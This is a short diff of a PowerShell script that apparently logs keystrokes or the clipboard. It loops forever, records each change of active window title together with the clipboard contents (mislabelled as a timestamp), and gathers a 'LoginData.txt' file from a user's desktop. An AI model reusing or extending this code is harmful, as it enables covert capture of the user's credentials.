@@ -161,7 +161,7 @@ while ($true) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
 					$TimeStamp = (get-clipboard)
-					$Outout = "`n[$WindowTitle - "\\?\"+$TimeStamp]`n"
+					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
                     $outfile += get-item "C:\Users\Mehmet Dere\Desktop\Yeniklasör\LoginData.txt"
